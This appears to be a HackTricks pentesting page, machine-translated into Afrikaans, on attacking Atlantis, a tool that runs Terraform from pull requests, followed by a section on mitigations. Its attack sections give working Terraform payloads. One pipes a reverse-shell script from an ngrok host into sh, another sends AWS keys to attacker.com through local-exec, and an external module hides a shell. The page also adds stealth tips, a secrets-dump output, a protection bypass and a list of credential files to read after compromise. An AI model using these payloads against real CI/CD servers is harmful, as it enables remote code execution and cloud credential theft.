# Atlantis Sekuriteit

<details>

{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}

## Basiese Inligting

Atlantis help jou basies om terraform vanaf Pull-aanvrae van jou git-bediener te hardloop.

![](<../.gitbook/assets/image (161).png>)

## Plaaslike Laboratorium

1. Gaan na die **atlantis vrystellingsbladsy** op [https://github.com/runatlantis/atlantis/releases](https://github.com/runatlantis/atlantis/releases) en **laai af** die een wat by jou pas.
2. Skep 'n **persoonlike token** (met repo-toegang) van jou **github**-gebruiker
3. Voer `./atlantis testdrive` uit en dit sal 'n **demonstrasie-repo** skep wat jy kan gebruik om met atlantis te **praat**
1. Jy kan die webbladsy besoek by 127.0.0.1:4141

## Atlantis Toegang

### Git-bedienergelde

**Atlantis** ondersteun verskeie git-gashere soos **Github**, **Gitlab**, **Bitbucket** en **Azure DevOps**.\
Nietemin, om toegang tot die ooreenstemmende repos te verkry en aksies uit te voer, moet daar aan hulle 'n sekere **bevoorregte toegang verleen word** (ten minste skryftoestemmings).\
[**Die dokumente**](https://www.runatlantis.io/docs/access-credentials.html#create-an-atlantis-user-optional) moedig aan om 'n gebruiker in hierdie platforms spesifiek vir Atlantis te skep, maar sommige mense mag persoonlike rekeninge gebruik.

{% hint style="warning" %}
In enige geval, vanuit 'n aanvaller se perspektief, gaan die **Atlantis-rekening** een wees wat baie **interessant is om te kompromiteer**.
{% endhint %}

### Webhooks

Atlantis gebruik opsioneel [**Webhook-geheime**](https://www.runatlantis.io/docs/webhook-secrets.html#generating-a-webhook-secret) om te valideer dat die **webhooks** wat dit van jou Git-bediener ontvang, **wettig** is.

Een manier om dit te bevestig sou wees om **versoeke net vanaf die IP-adresse** van jou Git-bediener toe te laat, maar 'n makliker manier is om 'n Webhook-geheim te gebruik.

Let daarop dat tensy jy 'n privaat github- of bitbucket-bediener gebruik, sal jy die webhook-eindpunte aan die internet moet blootstel.

{% hint style="warning" %}
Atlantis gaan **webhooks blootstel** sodat die git-bediener dit inligting kan stuur. Vanuit 'n aanvaller se perspektief sou dit interessant wees om te weet **of jy dit kan gebruik om boodskappe te stuur**.
{% endhint %}

### Verskaffer Gelde

[Vanuit die dokumente:](https://www.runatlantis.io/docs/provider-credentials.html)

Atlantis hardloop Terraform deur eenvoudigweg `terraform plan` en `apply`-opdragte op die bediener **waarop Atlantis gehuisves is** uit te voer. Net soos wanneer jy Terraform plaaslik hardloop, benodig Atlantis gelde vir jou spesifieke verskaffer.

Dit is aan jou hoe jy [gelde voorsien](https://www.runatlantis.io/docs/provider-credentials.html#aws-specific-info) vir jou spesifieke verskaffer aan Atlantis:

* Die Atlantis [Helm Grafiek](https://www.runatlantis.io/docs/deployment.html#kubernetes-helm-chart) en [AWS Fargate Module](https://www.runatlantis.io/docs/deployment.html#aws-fargate) het hul eie meganismes vir verskaffer gelde. Lees hul dokumente.
* As jy Atlantis in 'n wolk hardloop, het baie wolke maniere om wolk-API-toegang te gee aan aansoeke wat op hulle hardloop, bv.:
* [AWS EC2-rolle](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) (Soek na "EC2-rol")
* [GCE-instansie-diensrekeninge](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider\_reference)
* Baie gebruikers stel omgewingsveranderlikes in, bv. `AWS_ACCESS_KEY`, waar Atlantis hardloop.
* Ander skep die nodige konfigurasie l√™ers, bv. `~/.aws/credentials`, waar Atlantis hardloop.
* Gebruik die [HashiCorp Vault Verskaffer](https://registry.terraform.io/providers/hashicorp/vault/latest/docs) om verskaffer gelde te verkry.

{% hint style="warning" %}
Die **houer** waar **Atlantis** op **hardloop**, sal hoogstwaarskynlik **bevoorregte gelde** vir die verskaffers (AWS, GCP, Github...) wat Atlantis via Terraform bestuur, bevat.
{% endhint %}

### Webbladsy

Standaard sal Atlantis 'n **webbladsy in poort 4141 in plaaslike host** hardloop. Hierdie bladsy laat jou net toe om atlantis apply aan en af te skakel en die planstatus van die repos te kontroleer en hulle te ontgrendel (dit laat nie toe om dinge te wysig nie, so dit is nie baie nuttig nie).

Jy sal dit waarskynlik nie aan die internet blootgestel vind nie, maar dit lyk asof **geen gelde nodig is** om dit te benader (en as dit wel is, is `atlantis`:`atlantis` die **verstek** een).

## Bedienerkonfigurasie

Konfigurasie vir `atlantis bediener` kan gespesifiseer word deur middel van opdraglynvlaggies, omgewingsveranderlikes, 'n konfig-l√™er of 'n mengsel van die drie.

* Jy kan [**hier die lys van vlaggies**](https://www.runatlantis.io/docs/server-configuration.html#server-configuration) wat deur Atlantis-bedieners ondersteun word, vind
* Jy kan [**hier vind hoe om 'n konfig-opsie in 'n omgewingsveranderlike te omskep**](https://www.runatlantis.io/docs/server-configuration.html#environment-variables)

Waardes word **in hierdie volgorde gekies**:

1. Vlaggies
2. Omgewingsveranderlikes
3. Konfig-l√™er

{% hint style="warning" %}
Let daarop dat in die konfigurasie jy moontlik interessante waardes soos **tokens en wagwoorde** kan vind.
{% endhint %}

### Repos Konfigurasie

Sommige konfigurasies be√Ønvloed **hoe die repos bestuur word**. Dit is egter moontlik dat **elke repo verskillende instellings benodig**, dus is daar maniere om elke repo te spesifiseer. Dit is die prioriteitsvolgorde:

1. Repo [**`/atlantis.yml`**](https://www.runatlantis.io/docs/repo-level-atlantis-yaml.html#repo-level-atlantis-yaml-config) l√™er. Hierdie l√™er kan gebruik word om te spesifiseer hoe atlantis die repo moet hanteer. Tog kan sommige sleutels nie standaard hier gespesifiseer word sonder sekere vlaggies wat dit toelaat nie.
1. Waarskynlik nodig om toegelaat te word deur vlaggies soos `allowed_overrides` of `allow_custom_workflows`
2. [**Bedienerkant Konfig**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config): Jy kan dit deurgee met die vlag `--repo-config` en dit is 'n yaml wat nuwe instellings vir elke repo konfigureer (regexes ondersteun)

3. **Verstek** waardes
#### PR Beskerming

Atlantis maak dit moontlik om aan te dui of jy wil h√™ dat die **PR** deur iemand anders **`goedgekeur`** moet word (selfs al is dit nie ingestel in die takbeskerming nie) en/of **`saamvoegbaar`** moet wees (takbeskerming geslaag) **voordat die toepassing uitgevoer word**. Vanuit 'n veiligheidsoogpunt word dit aanbeveel om beide opsies in te stel.

In geval van `allowed_overrides` is Waar, kan hierdie instellings **oor geskryf word op elke projek deur die `/atlantis.yml` l√™er**.

#### Skripte

Die repo-konfigurasie kan **skripte spesifiseer** om uit te voer [**voor**](https://www.runatlantis.io/docs/pre-workflow-hooks.html#usage) (_pre werkstroom hakies_) en [**na**](https://www.runatlantis.io/docs/post-workflow-hooks.html) (_post werkstroom hakies_) 'n **werkstroom uitgevoer word**.

Daar is geen opsie om hierdie skripte in die **repo `/atlantis.yml`** l√™er te **spesifiseer** nie.

#### Werkvloei

In die repo-konfigurasie (bedienerkant-konfigurasie) kan jy [**'n nuwe verstek-werkvloei spesifiseer**](https://www.runatlantis.io/docs/server-side-repo-config.html#change-the-default-atlantis-workflow), of [**nuwe aangepaste werkvloei skep**](https://www.runatlantis.io/docs/custom-workflows.html#custom-workflows)**.** Jy kan ook **spesifiseer** watter **repos** toegang kan h√™ tot die **nuwe** gegenereerdes.\
Daarna kan jy die **atlantis.yaml** l√™er van elke repo toelaat om die werkvloei te **spesifiseer** wat gebruik moet word.

{% hint style="danger" %}
Indien die [**bedienerkant-konfigurasie**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allow_custom_workflows` op **Waar** ingestel is, kan werkvloei in die **`atlantis.yaml`** l√™er van elke repo **gespesifiseer** word. Dit is moontlik ook nodig dat **`allowed_overrides`** ook **`werkvloei`** spesifiseer om die werkvloei wat gebruik gaan word, te **oorheers**.\
Dit sal basies **RCE in die Atlantis-bedieners aan enige gebruiker wat toegang tot daardie repo kan verkry**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

#### Conftest Beleidskontrole

Atlantis ondersteun die hardloop van **bedienerkant** [**conftest**](https://www.conftest.dev/) **beleide** teen die plan uitset. Algemene gevalle vir die gebruik van hierdie stap sluit in:

* Weiering van die gebruik van 'n lys modules
* Bevestiging van eienskappe van 'n hulpbron tydens skepping
* Vang van onbedoelde hulpbronverwyderings
* Voorkoming van sekuriteitsrisiko's (d.w.s. blootstelling van veilige poorte aan die publiek)

Jy kan sien hoe om dit te konfigureer in [**die dokumentasie**](https://www.runatlantis.io/docs/policy-checking.html#how-it-works).

## Atlantis Opdragte

[**In die dokumentasie**](https://www.runatlantis.io/docs/using-atlantis.html#using-atlantis) kan jy die opsies vind wat jy kan gebruik om Atlantis te hardloop:
```bash
# Get help
atlantis help

# Run terraform plan
atlantis plan [options] -- [terraform plan flags]
##Options:
## -d directory
## -p project
## --verbose
## You can also add extra terraform options

# Run terraform apply
atlantis apply [options] -- [terraform apply flags]
##Options:
## -d directory
## -p project
## -w workspace
## --auto-merge-disabled
## --verbose
## You can also add extra terraform options
```
## Aanvalle

{% hint style="warning" %}
Indien jy tydens die uitbuiting hierdie **fout** vind: `Fout: Fout met die verkryging van die toestandsluit`

Jy kan dit regmaak deur die volgende uit te voer:
```
atlantis unlock #You might need to run this in a different PR
atlantis plan -- -lock=false
```
{% endhint %}

### Atlantis plan RCE - Konfigurasie wysiging in nuwe PR

Indien jy skryftoegang het tot 'n bewaarplek, sal jy in staat wees om 'n nuwe tak daarop te skep en 'n PR te genereer. As jy **`atlantis plan` kan uitvoer** (of dit word dalk outomaties uitgevoer) **sal jy binne die Atlantis-bediener kan RCE**.

Jy kan dit doen deur [**Atlantis om 'n eksterne data-bron te laat laai**](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source). Plaas net 'n lading soos die volgende in die `main.tf` l√™er:
```json
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Steiler Aanval

Jy kan hierdie aanval selfs op 'n **steiler manier** uitvoer, deur hierdie voorstelle te volg:

* In plaas daarvan om die rev shell direk in die terraform-l√™er by te voeg, kan jy 'n **eksterne hulpbron laai** wat die rev shell bevat:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Jy kan die rev shell kode vind in [https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules](https://github.com/carlospolop/terraform\_external\_module\_rev\_shell/tree/main/modules)

* In die eksterne bron, gebruik die **ref** funksie om die **terraform rev shell kode in 'n tak** binne die repo te verberg, iets soos: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`
* **In plaas daarvan** om 'n **PR na meester** te skep om Atlantis te trigger, **skep 2 takke** (test1 en test2) en skep 'n **PR van een na die ander**. Wanneer jy die aanval voltooi het, **verwyder net die PR en die takke**.

### Atlantis plan Secrets Dump

Jy kan **geheime wat deur terraform gebruik word dump** deur `atlantis plan` (`terraform plan`) te hardloop deur iets soos dit in die terraform l√™er te plaas:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
### Atlantis pas RCE toe - Konfigurasiewysiging in nuwe PR

Indien jy skryftoegang het tot 'n bewaarplek, sal jy in staat wees om 'n nuwe tak daarop te skep en 'n PR te genereer. As jy **`atlantis apply` kan uitvoer, sal jy in staat wees om RCE binne die Atlantis-bediener** uit te voer.

Gewoonlik sal jy egter 'n paar beskermings moet omseil:

- **Mergeable**: As hierdie beskerming in Atlantis ingestel is, kan jy slegs **`atlantis apply` hardloop as die PR mergeable is** (wat beteken dat die takbeskerming omseil moet word).
- Kontroleer potensi√´le [**takbeskermingsomseilings**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)
- **Goedgekeur**: As hierdie beskerming in Atlantis ingestel is, moet **'n ander gebruiker die PR goedkeur** voordat jy `atlantis apply` kan hardloop
- Standaard kan jy die [**Gitbot-token misbruik om hierdie beskerming te omseil**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/broken-reference/README.md)

Deur **`terraform apply` uit te voer op 'n skadelike Terraform-l√™er met** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Jy hoef net te verseker dat 'n sekere lading soos die volgende in die `main.tf`-l√™er eindig:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Volg die **aanbevelings van die vorige tegniek** om hierdie aanval op 'n **meer onopvallende manier** uit te voer.

### Terraform Param Injeksie

Wanneer `atlantis plan` of `atlantis apply` uitgevoer word, word terraform agter-die-skerm uitgevoer, jy kan bevele na terraform deurgee van atlantis deur iets soos te kommentarieer:
```bash
atlantis plan -- <terraform commands>
atlantis plan -- -h #Get terraform plan help

atlantis apply -- <terraform commands>
atlantis apply -- -h #Get terraform apply help
```
Iets wat jy kan deurgee is omgewingsveranderlikes wat nuttig kan wees om sekere beskermings te omseil. Kyk na terraform omgewingsveranderlikes in [https://www.terraform.io/cli/config/environment-variables](https://www.terraform.io/cli/config/environment-variables)

### Aangepaste Werkvloei

Die uitvoering van **skadelike aangepaste bou-opdragte** wat gespesifiseer is in 'n `atlantis.yaml` l√™er. Atlantis gebruik die `atlantis.yaml` l√™er van die trekversoek-tak, **nie** van `master`.\
Hierdie moontlikheid is genoem in 'n vorige afdeling:

{% hint style="danger" %}
As die [**bedienerkant konfig**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allow_custom_workflows` ingestel is op **True**, kan werkvloei **gespesifiseer** word in die **`atlantis.yaml`** l√™er van elke repo. Dit is ook moontlik nodig dat **`allowed_overrides`** ook **`workflow`** spesifiseer om die werkvloei te **oorheers wat gebruik gaan word**.

Dit sal basies **RCE in die Atlantis-bedieners aan enige gebruiker gee wat daardie repo kan bereik**.
```yaml
# atlantis.yaml
version: 3
projects:
- dir: .
workflow: custom1
workflows:
custom1:
plan:
steps:
- init
- run: my custom plan command
apply:
steps:
- run: my custom apply command
```
{% endhint %}

### Bypass beplanning/toepassing beskerming

Indien die [**bedienerkant konfig**](https://www.runatlantis.io/docs/server-side-repo-config.html#server-side-config) vlag `allowed_overrides` _gekonfigureer_ is met `apply_requirements`, is dit moontlik vir 'n repo om die beplanning/toepassing beskerming te **omseil om hulle te verbygaan**.
```yaml
repos:
- id: /.*/
apply_requirements: []
```
### PR Oorname

Indien iemand **`atlantis plan/apply` kommentaar op jou geldige trekversoeke stuur,** sal dit veroorsaak dat terraform loop wanneer jy dit nie wil nie.

Verder, as jy nie in die **takbeskerming** ingestel het om te vra om **heroorweging** van elke trekversoek wanneer 'n **nuwe toewysing gedoen word** daaraan nie, kan iemand **boosaardige opset** (kyk na vorige scenarios) in die terraform opstelling skryf, `atlantis plan/apply` hardloop en RCE verkry.

Dit is die **instelling** in Github takbeskerming:

![](<../.gitbook/assets/image (216).png>)

### Webhook Geheim

As jy daarin slaag om die webhook geheim te **steel** wat gebruik word of as daar **geen webhook geheim** gebruik word nie, kan jy die Atlantis webhook **oproep** en **atlantis bevele** direk aanroep.

### Bitbucket

Bitbucket Cloud ondersteun **nie webhook geheime nie**. Dit kan aanvallers toelaat om versoek van Bitbucket te **vervalste**. Maak seker dat jy slegs Bitbucket IP-adresse toelaat.

* Dit beteken dat 'n **aanvaller** **vals versoek aan Atlantis** kan maak wat lyk asof dit van Bitbucket afkomstig is.
* As jy `--repo-allowlist` spesifiseer, kan hulle slegs vals versoek maak met betrekking tot daardie repos, sodat die meeste skade wat hulle kan aanrig, sou wees om plan/apply op jou eie repos te doen.
* Om dit te voorkom, lys [Bitbucket se IP-adresse](https://confluence.atlassian.com/bitbucket/what-are-the-bitbucket-cloud-ip-addresses-i-should-use-to-configure-my-corporate-firewall-343343385.html) op (sien Uitgaande IPv4-adresse).

## Post-Exploitation

As jy toegang tot die bediener verkry het of ten minste 'n LFI het, is daar 'n paar interessante dinge wat jy moet probeer lees:

* `/home/atlantis/.git-credentials` Bevat vcs toegangskrediete
* `/atlantis-data/atlantis.db` Bevat vcs toegangskrediete met meer inligting
* `/atlantis-data/repos/<org_naam>`_`/`_`<repo_naam>/<pr_nommer>/<werkspasie>/<pad_na_gids>/.terraform/terraform.tfstate` Terraform staatl√™er
* Voorbeeld: /atlantis-data/repos/ghOrg\_/\_myRepo/20/default/env/prod/.terraform/terraform.tfstate
* `/proc/1/environ` Omgewingsveranderlikes
* `/proc/[2-20]/cmdline` Cmd lyn van `atlantis server` (kan sensitiewe data bevat)

## Versagtings

### Moet Nie Op Openbare Repos Gebruik Word <a href="#don-t-use-on-public-repos" id="don-t-use-on-public-repos"></a>

Omdat enigiemand kommentaar kan lewer op openbare trekversoeke, selfs met al die beskikbare sekuriteitsversagtings, is dit steeds gevaarlik om Atlantis op openbare repos te hardloop sonder behoorlike konfigurasie van die sekuriteitsinstellings.

### Moet Nie `--allow-fork-prs` Gebruik Nie <a href="#don-t-use-allow-fork-prs" id="don-t-use-allow-fork-prs"></a>

As jy op 'n openbare repo hardloop (wat nie aanbeveel word nie, sien hierbo) moet jy nie `--allow-fork-prs` instel (verstek na vals) nie omdat enigiemand 'n trekversoek van hul vurk na jou repo kan oopmaak.

### `--repo-allowlist` <a href="#repo-allowlist" id="repo-allowlist"></a>

Atlantis vereis dat jy 'n lys van toegelate repositoriums spesifiseer waarvandaan dit webhooks sal aanvaar via die `--repo-allowlist` vlag. Byvoorbeeld:

* Spesifieke repositoriums: `--repo-allowlist=github.com/runatlantis/atlantis,github.com/runatlantis/atlantis-tests`
* Jou hele organisasie: `--repo-allowlist=github.com/runatlantis/*`
* Elke repositorium in jou GitHub Enterprise-installasie: `--repo-allowlist=github.yourcompany.com/*`
* Alle repositoriums: `--repo-allowlist=*`. Nuttig wanneer jy in 'n beskermde netwerk is, maar gevaarlik sonder om ook 'n webhook geheim in te stel.

Hierdie vlag verseker dat jou Atlantis-installasie nie met repositoriums gebruik word wat jy nie beheer nie. Sien `atlantis server --help` vir meer inligting.

### Beskerm Terraform Beplanning <a href="#protect-terraform-planning" id="protect-terraform-planning"></a>

As aanvallers trekversoeke met boosaardige Terraform-kode indien jou bedreigingsmodel is, moet jy bewus wees dat `terraform apply` goedkeurings nie genoeg is nie. Dit is moontlik om boosaardige kode in 'n `terraform plan` uit te voer deur die [`external` data bron](https://registry.terraform.io/providers/hashicorp/external/latest/docs/data-sources/data\_source) te gebruik of deur 'n boosaardige verskaffer te spesifiseer. Hierdie kode kan dan jou geloofsbriewe uitlees.

Om dit te voorkom, kan jy:

1. Verskaffers in die Atlantis-beeld of -gasheer baklei en uitgaande verkeer in produksie ontken.
2. Implementeer die verskafferregisterprotokol intern en ontken openbare uitgaande verkeer, sodat jy beheer oor wie skryftoegang tot die register het.
3. Wysig jou [bedienerkant-repo-konfigurasie](https://www.runatlantis.io/docs/server-side-repo-config.html)'s `plan`-stap om te valideer teen die gebruik van verbode verskaffers of data-bronne of trekversoeke van nie toegelate gebruikers. Jy kan ook op hierdie punt ekstra validering byvoeg, bv. 'n "duim-op" op die trekversoek vereis voordat die `plan` kan voortgaan. Conftest kan hier nuttig wees.

### Webhook Geheime <a href="#webhook-secrets" id="webhook-secrets"></a>

Atlantis moet met Webhook-geheime hardloop word wat deur die `$ATLANTIS_GH_WEBHOOK_SECRET`/`$ATLANTIS_GITLAB_WEBHOOK_SECRET` omgewingsveranderlikes ingestel is. Selfs met die `--repo-allowlist` vlag ingestel, sonder 'n webhook-geheim, kan aanvallers versoek aan Atlantis maak wat voordoen as 'n repositorium wat toegelaat is. Webhook-geheime verseker dat die webhook-versoeke werklik van jou VCS-leweransier (GitHub of GitLab) afkomstig is.

As jy Azure DevOps gebruik, voeg in plaas van webhook-geheime 'n basiese gebruikersnaam en wagwoord by.

### Azure DevOps Basiese Verifikasie <a href="#azure-devops-basic-authentication" id="azure-devops-basic-authentication"></a>

Azure DevOps ondersteun die stuur van 'n basiese verifikasie-kop in alle webhook-gebeure. Dit vereis dat jy 'n HTTPS-URL vir jou webhook-plek gebruik.

### SSL/HTTPS <a href="#ssl-https" id="ssl-https"></a>

As jy webhook-geheime gebruik, maar jou verkeer oor HTTP is, kan die webhook-geheime gesteel word. Skakel SSL/HTTPS in deur die `--ssl-cert-file` en `--ssl-key-file` vlae te gebruik.

### Skakel Verifikasie op Atlantis-webbediener in <a href="#enable-authentication-on-atlantis-web-server" id="enable-authentication-on-atlantis-web-server"></a>

Dit word sterk aanbeveel om verifikasie in die webdiens in te skakel. Skakel Basiese Verifisering in deur die `--web-basic-auth=true` te gebruik en stel 'n gebruikersnaam en wagwoord in deur die `--web-username=jouGebruikersnaam` en `--web-password=jouWagwoord` vlae te gebruik.

Jy kan hierdie ook as omgewingsveranderlikes deurgee `ATLANTIS_WEB_BASIC_AUTH=true` `ATLANTIS_WEB_USERNAME=jouGebruikersnaam` en `ATLANTIS_WEB_PASSWORD=jouWagwoord`.

## Verwysings

* [**https://www.runatlantis.io/docs**](https://www.runatlantis.io/docs)
* [**https://www.runatlantis.io/docs/provider-credentials.html**](https://www.runatlantis.io/docs/provider-credentials.html)

<details>

{% hint style="success" %}
Leer & oefen AWS-hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Leer & oefen GCP-hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
{% endhint %}
